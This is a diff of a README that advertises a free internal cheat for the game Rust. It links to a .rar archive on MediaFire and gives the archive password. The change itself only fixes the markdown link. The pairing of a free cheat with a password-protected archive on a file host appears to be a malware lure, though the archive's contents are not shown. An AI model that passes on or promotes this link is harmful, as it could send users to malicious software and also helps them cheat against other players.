@@ -6,7 +6,7 @@
 
 ✅Rust is a brutal multiplayer survival game that challenges you to survive in a hostile environment full of dangers and enemies. You need to gather resources, craft items, build bases, and fight other players for loot and territory. But what if you could have an edge over your rivals and enjoy the game in a whole new way? That’s where Rust Free Internal Hack comes in.
 
-## 👉SoftWare LINK: [Link] (https://www.mediafire.com/file/7az9m2f66tm0zk1/R-LONNY-SW.rar)
+## 👉SoftWare LINK: [Link](https://www.mediafire.com/file/7az9m2f66tm0zk1/R-LONNY-SW.rar)
 
 ### 🔒Pass: 1199
 
